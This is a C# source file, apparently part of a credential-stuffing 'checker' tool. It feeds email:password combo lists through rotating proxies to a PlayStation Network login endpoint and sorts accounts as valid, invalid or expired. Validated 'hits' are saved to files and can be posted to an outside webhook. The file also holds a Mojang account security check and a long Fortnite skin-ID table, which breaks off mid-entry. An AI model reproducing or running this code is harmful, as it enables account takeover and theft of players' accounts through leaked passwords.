﻿using System; using Galaxy.Mainm;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class psn1kek
	{
		public static string Path1;
		public static string Path;
		public static string Path2;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();
		public static void startchecker1()
		{
			for (; ; )
			{
				while (!psn1check.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (psn1check.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = psn1check.RandomProxies();
								httpRequest.AddHeader("User-Agent", "PSN/ActionTokenAcquisition");
								httpRequest.AddHeader("Pragma", "no-cache");
								httpRequest.AddHeader("Accept", "*/*");
								httpRequest.AddHeader("Host", "mds.np.ac.playstation.net");
								httpRequest.AddHeader("X-Mln-ATAcq-Version", "1.0");
								httpRequest.AddHeader("X-Mln-ATAcq-Status", "OK");
								httpRequest.AddHeader("X-UC-LoginId", email);
								httpRequest.AddHeader("X-UC-Password", password);
								Random rnd = new Random();
								int one = rnd.Next(22, 80);
								int two = rnd.Next(222, 888);
								httpRequest.AddHeader("JSESSIONID", "04DF231A4087718334B47F6909059A0C.10242170160");
								string data = $"consoleid=0000000100840009140e0a{one}c{two}c00000000000000000000000000000000000";
                                Leaf.xNet.HttpResponse PostRequest = httpRequest.Post("https://mds.np.ac.playstation.net/ws/services/registrationActionToken", data, "application/x-www-form-urlencoded");
								string str = PostRequest.ToString();
								var headers = new Dictionary<string, string>();
								var headersList = new List<KeyValuePair<string, string>>();
								var receivedHeaders = PostRequest.EnumerateHeaders();
								var headddd = new List<string>();
								while (receivedHeaders.MoveNext())
								{
									var header = receivedHeaders.Current;
									string yea = (header.Key + " " + header.Value);
									headddd.Add(yea);
								}
								var result = string.Join("\n", headddd.ToArray());
								if (result.Contains("reason=21"))
                                {
									lock (Program.WriteLock)
								  	{
								  		Interlocked.Increment(ref psn1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
								  		Interlocked.Increment(ref psn1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
								  		Interlocked.Increment(ref psn1check.Bad); Interlocked.Increment(ref stats.bad);
								  		if (Program.config.showbad == "True" && Program.config.ui == 2)
								  		{
											if (Program.config.ui == 2)
											{
												Colorful.Console.WriteLine("[»] Invalid " + account, Color.Red);
											}
								  		}
								  		Save(Path + "\\Invalid.txt", account);
								  	}
									headddd.Clear();
									break;
								}
								else if (result.Contains("reason=50") || str.Contains("<BusinessToken>"))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref psn1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref psn1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref psn1check.Hits); Interlocked.Increment(ref stats.hits);
										if (Program.config.showgood == "True" && Program.config.ui == 2)
										{
											if (Program.config.ui == 2)
											{
												Colorful.Console.WriteLine("[»] Valid " + account, Color.Green);
											}
										}
										if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Valid.txt", account);
									}
									headddd.Clear();
									break;
								}
								else if (result.Contains("reason=80"))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref psn1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref psn1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref psn1check.custom);
										if (Program.config.showlocked == "True" && Program.config.ui == 2)
										{
											if (Program.config.ui == 2)
											{
												Colorful.Console.WriteLine("[»] Expired " + account, Color.Cyan);
											}
										}
										Save(Path + "\\Expired.txt", account);
									}
									headddd.Clear();
									break;
								}
								else
								{
								
									string acc1 = email + ":" + password;
									psn1check.Combo.Enqueue(acc1);
									Interlocked.Increment(ref psn1check.retry);
									headddd.Clear();
									break;
								}
							}
							catch (Exception )
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								psn1check.Combo.Enqueue(acc1);
								Interlocked.Increment(ref psn1check.retry);

								break;
							}
						}
					}
				}
			}
		}
		public static string Parse(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
 
		private static Uri SFACheckUri = new Uri("https://api.mojang.com/user/security/challenges");
		public static bool SFACheck(string token)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = psn1check.RandomProxies();
						httpRequest.AddHeader("Authorization", "Bearer " + token);
						if (httpRequest.Get(psn1kek.SFACheckUri).ToString() == "[]")
							return true;
						break;
					}
				}
				catch
				{
					Interlocked.Increment(ref psn1check.Errors);
				}
			}
			return false;
		}
		public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

		public static Hashtable Skins = new Hashtable
		{
		   {
  "cid_001_athena_commando_f_default",
  "ch1ramirez"
},
{
  "cid_002_athena_commando_f_default",
  "ch1banshee"
},
{
  "cid_003_athena_commando_f_default",
  "ch1headhunter"
},
{
  "cid_004_athena_commando_f_default",
  "ch1wildcat"
},
{
  "cid_005_athena_commando_m_default",
  "ch1jonesy"
},
{
  "cid_006_athena_commando_m_default",
  "ch1spitfire"
},
{
  "cid_007_athena_commando_m_default",
  "ch1hawk"
},
{
  "cid_008_athena_commando_m_default",
  "ch1renegade"
},
{
  "cid_009_athena_commando_m",
  "tracker"
},
{
  "cid_010_athena_commando_m",
  "ranger"
},
{
  "cid_011_athena_commando_m",
  "scout"
},
{
  "cid_012_athena_commando_m",
  "trooper"
},
{
  "cid_013_athena_commando_f",
  "renegade"
},
{
  "cid_014_athena_commando_f",
  "pathfinder"
},
{
  "cid_015_athena_commando_f",
  "assaulttrooper"
},
{
  "cid_016_athena_commando_f",
  "commando"
},
{
  "cid_017_athena_commando_m",
  "aerialassaulttrooper"
},
{
  "cid_018_athena_commando_m",
  "reconscout"
},
{
  "cid_019_athena_commando_m",
  "infiltrator"
},
{
  "cid_020_athena_commando_m",
  "specialforces"
},
{
  "cid_021_athena_commando_f",
  "brawler"
},
{
  "cid_022_athena_commando_f",
  "reconexpert"
},
{
  "cid_023_athena_commando_f",
  "munitionsexpert"
},
{
  "cid_024_athena_commando_f",
  "reconspecialist"
},
{
  "cid_025_athena_commando_m",
  "firststrikespecialist"
},
{
  "cid_026_athena_commando_m",
  "desperado"
},
{
  "cid_027_athena_commando_f",
  "survivalspecialist"
},
{
  "cid_028_athena_commando_f",
  "renegaderaider"
},
{
  "cid_029_athena_commando_f_halloween",
  "ghoultrooper"
},
{
  "cid_030_athena_commando_m_halloween",
  "skulltrooper"
},
{
  "cid_031_athena_commando_m_retro",
  "raptor"
},
{
  "cid_032_athena_commando_m_medieval",
  "bluesquire"
},
{
  "cid_033_athena_commando_f_medieval",
  "royaleknight"
},
{
  "cid_034_athena_commando_f_medieval",
  "redknight"
},
{
  "cid_035_athena_commando_m_medieval",
  "blackknight"
},
{
  "cid_036_athena_commando_m_wintercamo",
  "absolutezero"
},
{
  "cid_037_athena_commando_f_wintercamo",
  "arcticassassin"
},
{
  "cid_038_athena_commando_m_disco",
  "funkops"
},
{
  "cid_039_athena_commando_f_disco",
  "sparklespecialist"
},
{
  "cid_040_athena_commando_m_district",
  "devastator"
},
{
  "cid_041_athena_commando_f_district",
  "dominator"
},
{
  "cid_042_athena_commando_m_cyberpunk",
  "circuitbreaker"
},
{
  "cid_043_athena_commando_f_stealth",
  "shadowops"
},
{
  "cid_044_athena_commando_f_scipop",
  "britebomber"
},
{
  "cid_045_athena_commando_m_holidaysweater",
  "yuletideranger"
},
{
  "cid_046_athena_commando_f_holidaysweater",
  "nogops"
},
{
  "cid_047_athena_commando_f_holidayreindeer",
  "red-nosedraider"
},
{
  "cid_048_athena_commando_f_holidaygingerbread",
  "gingergunner"
},
{
  "cid_049_athena_commando_m_holidaygingerbread",
  "merrymarauder"
},
{
  "cid_050_athena_commando_m_holidaynutcracker",
  "crackshot"
},
{
  "cid_051_athena_commando_m_holidayelf",
  "codenamee.l.f."
},
{
  "cid_052_athena_commando_f_psblue",
  "blueteamleader"
},
{
  "cid_053_athena_commando_m_skidude",
  "alpineace"
},
{
  "cid_054_athena_commando_m_skidude_usa",
  "alpineace(usa)"
},
{
  "cid_055_athena_commando_m_skidude_can",
  "alpineace(can)"
},
{
  "cid_056_athena_commando_m_skidude_gbr",
  "alpineace(gbr)"
},
{
  "cid_057_athena_commando_m_skidude_fra",
  "alpineace(fra)"
},
{
  "cid_058_athena_commando_m_skidude_ger",
  "alpineace(ger)"
},
{
  "cid_059_athena_commando_m_skidude_chn",
  "alpineace(chn)"
},
{
  "cid_060_athena_commando_m_skidude_kor",
  "alpineace(kor)"
},
{
  "cid_061_athena_commando_f_skigirl",
  "mogulmaster"
},
{
  "cid_062_athena_commando_f_skigirl_usa",
  "mogulmaster(usa)"
},
{
  "cid_063_athena_commando_f_skigirl_can",
  "mogulmaster(can)"
},
{
  "cid_064_athena_commando_f_skigirl_gbr",
  "mogulmaster(gbr)"
},
{
  "cid_065_athena_commando_f_skigirl_fra",
  "mogulmaster(fra)"
},
{
  "cid_066_athena_commando_f_skigirl_ger",
  "mogulmaster(ger)"
},
{
  "cid_067_athena_commando_f_skigirl_chn",
  "mogulmaster(chn)"
},
{
  "cid_068_athena_commando_f_skigirl_kor",
  "mogulmaster(kor)"
},
{
  "cid_069_athena_commando_f_pinkbear",
  "cuddleteamleader"
},
{
  "cid_070_athena_commando_m_cupid",
  "loveranger"
},
{
  "cid_071_athena_commando_m_wukong",
  "wukong"
},
{
  "cid_072_athena_commando_m_scout",
  "sashsergeant"
},
{
  "cid_073_athena_commando_f_scuba",
  "snorkelops"
},
{
  "cid_074_athena_commando_f_stripe",
  "junglescout"
},
{
  "cid_075_athena_commando_f_stripe",
  "tacticsofficer"
},
{
  "cid_076_athena_commando_f_sup",
  "dazzle"
},
{
  "cid_077_athena_commando_m_sup",
  "hyperion"
},
{
  "cid_078_athena_commando_m_camo",
  "highriseassaulttrooper"
},
{
  "cid_079_athena_commando_f_camo",
  "towerreconspecialist"
},
{
  "cid_080_athena_commando_m_space",
  "missionspecialist"
},
{
  "cid_081_athena_commando_f_space",
  "moonwalker"
},
{
  "cid_082_athena_commando_m_scavenger",
  "rustlord"
},
{
  "cid_083_athena_commando_f_tactical",
  "eliteagent"
},
{
  "cid_084_athena_commando_m_assassin",
  "thereaper"
},
{
  "cid_085_athena_commando_m_twitch",
  "subcommander"
},
{
  "cid_086_athena_commando_m_redsilk",
  "crimsonscout"
},
{
  "cid_087_athena_commando_f_redsilk",
  "scarletdefender"
},
{
  "cid_088_athena_commando_m_spaceblack",
  "darkvoyager"
},
{
  "cid_089_athena_commando_m_retrogrey",
  "havoc"
},
{
  "cid_090_athena_commando_m_tactical",
  "rogueagent"
},
{
  "cid_091_athena_commando_m_redshirt",
  "radiantstriker"
},
{
  "cid_092_athena_commando_f_redshirt",
  "brilliantstriker"
},
{
  "cid_093_athena_commando_m_dinosaur",
  "rex"
},
{
  "cid_094_athena_commando_m_rider",
  "burnout"
},
{
  "cid_095_athena_commando_m_founder",
  "warpaint"
},
{
  "cid_096_athena_commando_f_founder",
  "roseteamleader"
},
{
  "cid_097_athena_commando_f_rockerpunk",
  "powerchord"
},
{
  "cid_098_athena_commando_f_stpatty",
  "sgt.greenclover"
},
{
  "cid_099_athena_commando_f_scathach",
  "highlandwarrior"
},
{
  "cid_100_athena_commando_m_cuchulainn",
  "battlehound"
},
{
  "cid_101_athena_commando_m_stealth",
  "midnightops"
},
{
  "cid_102_athena_commando_m_raven",
  "raven"
},
{
  "cid_103_athena_commando_m_bunny",
  "rabbitraider"
},
{
  "cid_104_athena_commando_f_bunny",
  "bunnybrawler"
},
{
  "cid_105_athena_commando_f_spaceblack",
  "darkvanguard"
},
{
  "cid_106_athena_commando_f_taxi",
  "whiplash"
},
{
  "cid_107_athena_commando_f_pajamaparty",
  "triceraops"
},
{
  "cid_108_athena_commando_m_fishhead",
  "leviathan"
},
{
  "cid_109_athena_commando_m_pizza",
  "tomatohead"
},
{
  "cid_110_athena_commando_f_circuitbreaker",
  "cipher"
},
{
  "cid_111_athena_commando_f_robo",
  "steelsight"
},
{
  "cid_112_athena_commando_m_brite",
  "britegunner"
},
{
  "cid_113_athena_commando_m_blueace",
  "royalebomber"
},
{
  "cid_114_athena_commando_f_tacticalwoodland",
  "trailblazer"
},
{
  "cid_115_athena_commando_m_carbideblue",
  "carbide"
},
{
  "cid_116_athena_commando_m_carbideblack",
  "omega"
},
{
  "cid_117_athena_commando_m_tacticaljungle",
  "squadleader"
},
{
  "cid_118_athena_commando_f_valor",
  "valor"
},
{
  "cid_119_athena_commando_f_candy",
  "zoey"
},
{
  "cid_120_athena_commando_f_graffiti",
  "teknique"
},
{
  "cid_121_athena_commando_m_graffiti",
  "abstrakt"
},
{
  "cid_122_athena_commando_m_metal",
  "diecast"
},
{
  "cid_123_athena_commando_f_metal",
  "chromium"
},
{
  "cid_124_athena_commando_f_auroraglow",
  "nitelite"
},
{
  "cid_125_athena_commando_m_tacticalwoodland",
  "battlehawk"
},
{
  "cid_126_athena_commando_m_auroraglow",
  "liteshow"
},
{
  "cid_127_athena_commando_m_hazmat",
  "toxictrooper"
},
{
  "cid_128_athena_commando_f_hazmat",
  "hazardagent"
},
{
  "cid_129_athena_commando_m_deco",
  "venturion"
},
{
  "cid_130_athena_commando_m_merman",
  "moistymerman"
},
{
  "cid_131_athena_commando_m_warpaint",
  "bandolier"
},
{
  "cid_132_athena_commando_m_venus",
  "flytrap"
},
{
  "cid_133_athena_commando_f_deco",
  "ventura"
},
{
  "cid_134_athena_commando_m_jailbird",
  "scoundrel"
},
{
  "cid_135_athena_commando_f_jailbird",
  "rapscallion"
},
{
  "cid_136_athena_commando_m_streetbasketball",
  "jumpshot"
},
{
  "cid_137_athena_commando_f_streetbasketball",
  "triplethreat"
},
{
  "cid_138_athena_commando_m_psburnout",
  "bluestriker"
},
{
  "cid_139_athena_commando_m_fighterpilot",
  "wingman"
},
{
  "cid_140_athena_commando_m_visitor",
  "thevisitor"
},
{
  "cid_141_athena_commando_m_darkeagle",
  "omen"
},
{
  "cid_142_athena_commando_m_wwiipilot",
  "skystalker"
},
{
  "cid_143_athena_commando_f_darkninja",
  "fate"
},
{
  "cid_144_athena_commando_m_soccerdudea",
  "superstriker"
},
{
  "cid_145_athena_commando_m_soccerdudeb",
  "midfieldmaestro"
},
{
  "cid_146_athena_commando_m_soccerdudec",
  "aerialthreat"
},
{
  "cid_147_athena_commando_m_soccerduded",
  "stalwartsweeper"
},
{
  "cid_148_athena_commando_f_soccergirla",
  "dynamicdribbler"
},
{
  "cid_149_athena_commando_f_soccergirlb",
  "poisedplaymaker"
},
{
  "cid_150_athena_commando_f_soccergirlc",
  "finessefinisher"
},
{
  "cid_151_athena_commando_f_soccergirld",
  "clinicalcrosser"
},
{
  "cid_152_athena_commando_f_carbideorange",
  "criterion"
},
{
  "cid_153_athena_commando_f_carbideblack",
  "oblivion"
},
{
  "cid_154_athena_commando_m_gumshoe",
  "sleuth"
},
{
  "cid_155_athena_commando_f_gumshoe",
  "gumshoe"
},
{
  "cid_156_athena_commando_f_fuzzybearind",
  "fireworksteamleader"
},
{
  "cid_157_athena_commando_m_starsandstripes",
  "star-spangledtrooper"
},
{
  "cid_158_athena_commando_f_starsandstripes",
  "star-spangledranger"
},
{
  "cid_159_athena_commando_m_gumshoedark",
  "noir"
},
{
  "cid_160_athena_commando_m_speedyred",
  "vertex"
},
{
  "cid_161_athena_commando_m_drift",
  "drift"
},
{
  "cid_162_athena_commando_f_streetracer",
  "redline"
},
{
  "cid_163_athena_commando_f_viking",
  "huntress"
},
{
  "cid_164_athena_commando_m_viking",
  "magnus"
},
{
  "cid_165_athena_commando_m_darkviking",
  "ragnarok"
},
{
  "cid_166_athena_commando_f_lifeguard",
  "sunstrider"
},
{
  "cid_167_athena_commando_m_tacticalbadass",
  "sledgehammer"
},
{
  "cid_168_athena_commando_m_shark",
  "chompsr."
},
{
  "cid_169_athena_commando_m_luchador",
  "maskedfury"
},
{
  "cid_170_athena_commando_f_luchador",
  "dynamo"
},
{
  "cid_171_athena_commando_m_sharpdresser",
  "moniker"
},
{
  "cid_172_athena_commando_f_sharpdresser",
  "fortune"
},
{
  "cid_173_athena_commando_f_starfishuniform",
  "rook"
},
{
  "cid_174_athena_commando_f_carbidewhite",
  "eon"
},
{
  "cid_175_athena_commando_m_celestial",
  "galaxy"
},
{
  "cid_176_athena_commando_m_lifeguard",
  "suntanspecialist"
},
{
  "cid_177_athena_commando_m_streetracercobra",
  "maverick"
},
{
  "cid_178_athena_commando_f_streetracercobra",
  "shade"
},
{
  "cid_179_athena_commando_f_scuba",
  "reefranger"
},
{
  "cid_180_athena_commando_m_scuba",
  "wreckraider"
},
{
  "cid_182_athena_commando_m_modernmilitary",
  "archetype"
},
{
  "cid_183_athena_commando_m_modernmilitaryred",
  "doublehelix"
},
{
  "cid_184_athena_commando_m_durrburgerworker",
  "grillsergeant"
},
{
  "cid_185_athena_commando_m_durrburgerhero",
  "beefboss"
},
{
  "cid_186_athena_commando_m_exercise",
  "mulletmarauder"
},
{
  "cid_187_athena_commando_f_fuzzybearpanda",
  "p.a.n.d.a.teamleader"
},
{
  "cid_188_athena_commando_f_streetracerwhite",
  "whiteout"
},
{
  "cid_189_athena_commando_f_exercise",
  "aerobicassassin"
},
{
  "cid_190_athena_commando_m_streetracerwhite",
  "overtaker"
},
{
  "cid_191_athena_commando_m_sushichef",
  "sushimaster"
},
{
  "cid_192_athena_commando_m_hippie",
  "faroutman"
},
{
  "cid_193_athena_commando_f_hippie",
  "dreamflower"
},
{
  "cid_194_athena_commando_f_ravenquill",
  "ravage"
},
{
  "cid_195_athena_commando_f_bling",
  "theace"
},
{
  "cid_196_athena_commando_m_biker",
  "backbone"
},
{
  "cid_197_athena_commando_f_biker",
  "chopper"
},
{
  "cid_198_athena_commando_m_bluesamurai",
  "musha"
},
{
  "cid_199_athena_commando_f_bluesamurai",
  "hime"
},
{
  "cid_200_athena_commando_m_darkpaintballer",
  "enforcer"
},
{
  "cid_201_athena_commando_m_desertops",
  "armadillo"
},
{
  "cid_202_athena_commando_f_desertops",
  "scorpion"
},
{
  "cid_203_athena_commando_m_cloakedstar",
  "cloakedstar"
},
{
  "cid_204_athena_commando_m_garageband",
  "stageslayer"
},
{
  "cid_205_athena_commando_f_garageband",
  "synthstar"
},
{
  "cid_206_athena_commando_m_bling",
  "wildcard"
},
{
  "cid_207_athena_commando_m_footballdudea",
  "endzone"
},
{
  "cid_208_athena_commando_m_footballdudeb",
  "gridiron"
},
{
  "cid_209_athena_commando_m_footballdudec",
  "spiked"
},
{
  "cid_210_athena_commando_f_footballgirla",
  "blitz"
},
{
  "cid_211_athena_commando_f_footballgirlb",
  "rush"
},
{
  "cid_212_athena_commando_f_footballgirlc",
  "interceptor"
},
{
  "cid_214_athena_commando_f_footballreferee",
  "whistlewarrior"
},
{
  "cid_215_athena_commando_m_footballreferee",
  "stripedsoldier"
},
{
  "cid_216_athena_commando_f_medic",
  "fieldsurgeon"
},
{
  "cid_217_athena_commando_m_medic",
  "triagetrooper"
},
{
  "cid_218_athena_commando_m_greenberet",
  "garrison"
},
{
  "cid_219_athena_commando_m_hacivat",
  "hacivat"
},
{
  "cid_220_athena_commando_f_clown",
  "peekaboo"
},
{
  "cid_221_athena_commando_m_clown",
  "nitenite"
},
{
  "cid_222_athena_commando_f_darkviking",
  "valkyrie"
},
{
  "cid_223_athena_commando_m_dieselpunk",
  "maximillian"
},
{
  "cid_224_athena_commando_f_dieselpunk",
  "airheart"
},
{
  "cid_225_athena_commando_m_octoberfest",
  "ludwig"
},
{
  "cid_226_athena_commando_f_octoberfest",
  "heidi"
},
{
  "cid_227_athena_commando_f_vampire",
  "dusk"
},
{
  "cid_228_athena_commando_m_vampire",
  "sanctum"
},
{
  "cid_229_athena_commando_f_darkbomber",
  "darkbomber"
},
{
  "cid_230_athena_commando_m_werewolf",
  "dire"
},
{
  "cid_231_athena_commando_f_redriding",
  "fable"
},
{
  "cid_232_athena_commando_f_halloweentomato",
  "nightshade"
},
{
  "cid_233_athena_commando_m_fortnitedj",
  "djyonder"
},
{
  "cid_234_athena_commando_m_llamarider",
  "giddy-up"
},
{
  "cid_235_athena_commando_m_scarecrow",
  "hayman"
},
{
  "cid_236_athena_commando_f_scarecrow",
  "strawops"
},
{
  "cid_237_athena_commando_f_cowgirl",
  "calamity"
},
{
  "cid_238_athena_commando_f_footballgirld",
  "juke"
},
{
  "cid_239_athena_commando_m_footballduded",
  "strongguard"
},
{
  "cid_240_athena_commando_f_plague",
  "scourge"
},
{
  "cid_241_athena_commando_m_plague",
  "plague"
},
{
  "cid_242_athena_commando_f_bullseye",
  "bullseye"
},
{
  "cid_243_athena_commando_m_pumpkinslice",
  "hollowhead"
},
{
  "cid_244_athena_commando_m_pumpkinsuit",
  "jackgourdon"
},
{
  "cid_245_athena_commando_f_durrburgerpjs",
  "onesie"
},
{
  "cid_246_athena_commando_f_grave",
  "skullranger"
},
{
  "cid_247_athena_commando_m_guanyu",
  "guanyu"
},
{
  "cid_248_athena_commando_m_blackwidow",
  "spiderknight"
},
{
  "cid_249_athena_commando_f_blackwidow",
  "arachne"
},
{
  "cid_250_athena_commando_m_evilcowboy",
  "deadfire"
},
{
  "cid_251_athena_commando_f_muertos",
  "rosa"
},
{
  "cid_252_athena_commando_m_muertos",
  "dante"
},
{
  "cid_253_athena_commando_m_militaryfashion2",
  "summitstriker"
},
{
  "cid_254_athena_commando_m_zombie",
  "brainiac"
},
{
  "cid_255_athena_commando_f_halloweenbunny",
  "bunnymoon"
},
{
  "cid_256_athena_commando_m_pumpkin",
  "patchpatroller"
},
{
  "cid_257_athena_commando_m_samuraiultra",
  "shogun"
},
{
  "cid_258_athena_commando_f_fuzzybearhalloween",
  "spookyteamleader"
},
{
  "cid_259_athena_commando_m_streetops",
  "reflex"
},
{
  "cid_260_athena_commando_f_streetops",
  "instinct"
},
{
  "cid_261_athena_commando_m_raptorarcticcamo",
  "frostbite"
},
{
  "cid_262_athena_commando_m_madcommander",
  "ruckus"
},
{
  "cid_263_athena_commando_f_madcommander",
  "mayhem"
},
{
  "cid_264_athena_commando_m_animaljackets",
  "growler"
},
{
  "cid_265_athena_commando_f_animaljackets",
  "flapjackie"
},
{
  "cid_266_athena_commando_f_llamarider",
  "yee-haw"
},
{
  "cid_267_athena_commando_m_robotred",
  "a.i.m."
},
{
  "cid_268_athena_commando_m_rockerpunk",
  "riot"
},
{
  "cid_269_athena_commando_m_wizard",
  "castor"
},
{
  "cid_270_athena_commando_f_witch",
  "elmira"
},
{
  "cid_271_athena_commando_f_sushichef",
  "makimaster"
},
{
  "cid_272_athena_commando_m_hornedmask",
  "taro"
},
{
  "cid_273_athena_commando_f_hornedmask",
  "nara"
},
{
  "cid_274_athena_commando_m_feathers",
  "tenderdefender"
},
{
  "cid_275_athena_commando_m_sniperhood",
  "longshot"
},
{
  "cid_276_athena_commando_f_sniperhood",
  "insight"
},
{
  "cid_277_athena_commando_m_moth",
  "mothmando"
},
{
  "cid_278_athena_commando_m_yeti",
  "trog"
},
{
  "cid_279_athena_commando_m_tacticalsanta",
  "sgt.winter"
},
{
  "cid_280_athena_commando_m_snowman",
  "slushysoldier"
},
{
  "cid_281_athena_commando_f_snowboard",
  "powder"
},
{
  "cid_286_athena_commando_f_neoncat",
  "lynx"
},
{
  "cid_287_athena_commando_m_arcticsniper",
  "zenith"
},
{
  "cid_288_athena_commando_m_iceking",
  "theiceking"
},
{
  "cid_290_athena_commando_f_bluebadass",
  "waypoint"
},
{
  "cid_291_athena_commando_m_dieselpunk02",
  "cloudbreaker"
},
{
  "cid_292_athena_commando_f_dieselpunk02",
  "wingtip"
},
{
  "cid_293_athena_commando_m_ravenwinter",
  "frozenraven"
},
{
  "cid_294_athena_commando_f_redknightwinter",
  "frozenredknight"
},
{
  "cid_295_athena_commando_m_cupidwinter",
  "frozenloveranger"
},
{
  "cid_296_athena_commando_m_math",
  "prodigy"
},
{
  "cid_297_athena_commando_f_math",
  "maven"
},
{
  "cid_298_athena_commando_f_icemaiden",
  "glimmer"
},
{
  "cid_299_athena_commando_m_snowninja",
  "snowfoot"
},
{
  "cid_300_athena_commando_f_angel",
  "ark"
},
{
  "cid_301_athena_commando_m_rhino",
  "beastmode"
},
{
  "cid_302_athena_commando_f_nutcracker",
  "crackabella"
},
{
  "cid_303_athena_commando_f_snowfairy",
  "sugarplum"
},
{
  "cid_304_athena_commando_m_gnome",
  "grimbles"
},
{
  "cid_308_athena_commando_f_fortnitedj",
  "djbop"
},
{
  "cid_309_athena_commando_m_streetgoth",
  "paradox"
},
{
  "cid_310_athena_commando_f_streetgoth",
  "lace"
},
{
  "cid_311_athena_commando_m_reindeer",
  "red-nosedranger"
},
{
  "cid_312_athena_commando_f_funkops",
  "discodiva"
},
{
  "cid_313_athena_commando_m_kpopfashion",
  "ikonik"
},
{
  "cid_314_athena_commando_m_krampus",
  "krampus"
},
{
  "cid_315_athena_commando_m_teriyakifish",
  "fishstick"
},
{
  "cid_316_athena_commando_f_winterholiday",
  "tinseltoes"
},
{
  "cid_317_athena_commando_m_winterghoul",
  "cloakedshadow"
},
{
  "cid_318_athena_commando_m_demon",
  "malcore"
},
{
  "cid_319_athena_commando_f_nautilus",
  "deepseadominator"
},
{
  "cid_320_athena_commando_m_nautilus",
  "deepseadestroyer"
},
{
  "cid_321_athena_commando_m_militaryfashion1",
  "verge"
},
{
  "cid_322_athena_commando_m_techops",
  "techops"
},
{
  "cid_323_athena_commando_m_barbarian",
  "jaeger"
},
{
  "cid_324_athena_commando_f_barbarian",
  "fyra"
},
{
  "cid_325_athena_commando_m_wavyman",
  "bendie"
},
{
  "cid_326_athena_commando_f_wavyman",
  "twistie"
},
{
  "cid_327_athena_commando_m_bluemystery",
  "cobalt"
},
{
  "cid_328_athena_commando_f_tennis",
  "volleygirl"
},
{
  "cid_329_athena_commando_f_snowninja",
  "snowstrike"
},
{
  "cid_330_athena_commando_f_icequeen",
  "theicequeen"
},
{
  "cid_331_athena_commando_m_taxi",
  "cabbie"
},
{
  "cid_332_athena_commando_m_prisoner",
  "theprisoner"
},
{
  "cid_333_athena_commando_m_squishy",
  "marshmello"
},
{
  "cid_334_athena_commando_m_scrapyard",
  "kitbash"
},
{
  "cid_335_athena_commando_f_scrapyard",
  "sparkplug"
},
{
  "cid_336_athena_commando_m_dragonmask",
  "firewalker"
},
{
  "cid_337_athena_commando_f_celestial",
  "galaxyscout"
},
{
  "cid_338_athena_commando_m_dumplingman",
  "baobros"
},
{
  "cid_339_athena_commando_m_robottrouble",
  "revolt"
},
{
  "cid_340_athena_commando_f_robottrouble",
  "rebel"
},
{
  "cid_341_athena_commando_f_skullbrite",
  "skully"
},
{
  "cid_342_athena_commando_m_streetracermetallic",
  "honorguard"
},
{
  "cid_343_athena_commando_m_cupiddark",
  "fallenloveranger"
},
{
  "cid_344_athena_commando_m_icecream",
  "lilwhip"
},
{
  "cid_345_athena_commando_m_lovellama",
  "heartbreaker"
},
{
  "cid_346_athena_commando_m_dragonninja",
  "hybrid"
},
{
  "cid_347_athena_commando_m_pirateprogressive",
  "blackheart"
},
{
  "cid_348_athena_commando_f_medusa",
  "sidewinder"
},
{
  "cid_349_athena_commando_m_banana",
  "peely"
},
{
  "cid_350_athena_commando_m_masterkey",
  "masterkey"
},
{
  "cid_351_athena_commando_f_fireelf",
  "ember"
},
{
  "cid_352_athena_commando_f_shiny",
  "luxe"
},
{
  "cid_353_athena_commando_f_bandolier",
  "bandolette"
},
{
  "cid_354_athena_commando_m_munitionsexpert",
  "munitionsmajor"
},
{
  "cid_355_athena_commando_m_farmer",
  "hayseed"
},
{
  "cid_356_athena_commando_f_farmer",
  "sunflower"
},
{
  "cid_357_athena_commando_m_orangecamo",
  "hypernova"
},
{
  "cid_358_athena_commando_m_aztec",
  "mezmer"
},
{
  "cid_359_athena_commando_f_aztec",
  "sunbird"
},
{
  "cid_360_athena_commando_m_techopsblue",
  "carboncommando"
},
{
  "cid_361_athena_commando_m_bandageninja",
  "kenji"
},
{
  "cid_362_athena_commando_f_bandageninja",
  "kuno"
},
{
  "cid_363_athena_commando_m_sciops",
  "axiom"
},
{
  "cid_364_athena_commando_f_sciops",
  "psion"
},
{
  "cid_365_athena_commando_m_luckyrider",
  "luckyrider"
},
{
  "cid_366_athena_commando_m_tropical",
  "marino"
},
{
  "cid_367_athena_commando_f_tropical",
  "laguna"
},
{
  "cid_369_athena_commando_f_devilrock",
  "malice"
},
{
  "cid_370_athena_commando_m_evilsuit",
  "inferno"
},
{
